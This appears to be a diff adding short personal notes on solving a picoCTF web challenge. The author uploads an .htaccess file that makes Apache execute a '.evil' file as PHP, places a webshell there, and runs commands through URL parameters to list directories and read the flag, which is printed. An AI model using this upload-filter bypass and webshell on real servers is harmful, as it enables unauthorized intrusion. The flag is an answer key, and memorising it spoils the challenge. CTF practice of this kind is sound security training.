@@ -1,0 +1,18 @@
+
+
+.htaccess file --> change the treatment of .evil to .php where gave a shell backdoor
+backdoor.evil file --> contains php webshell code where i can run the commands.
+
+.htaccess file tricked the apache server into running a php shell.
+
+uploaded path -->
+http://amiable-citadel.picoctf.net:54812/uploads.php  --> images/backdoor.evil, images/.htaccess
+
+usually html file sits in /var/www/html/
+http://amiable-citadel.picoctf.net:54812/images/backdoor.evil?cmd=ls+/var/www/
+
+flag.txt
+html
+
+http://amiable-citadel.picoctf.net:54812/images/backdoor.evil?cmd=cat+/var/www/flag.txt
+picoCTF{s3rv3r_byp4ss_65a9e718}
